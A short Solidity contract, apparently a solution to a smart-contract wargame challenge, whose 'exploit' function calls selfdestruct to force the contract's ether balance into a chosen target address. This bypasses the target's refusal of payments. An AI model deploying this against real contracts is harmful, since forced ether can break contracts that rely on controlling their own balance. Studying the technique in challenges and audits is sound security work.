// SPDX-License-Identifier: MIT
pragma solidity 0.8.17;

contract ForceAddress{
    address payable forceAddress;

    constructor(address payable _forceAddress) payable{
        forceAddress = _forceAddress;
    }

 function exploit() public {
        selfdestruct(forceAddress);
    }
}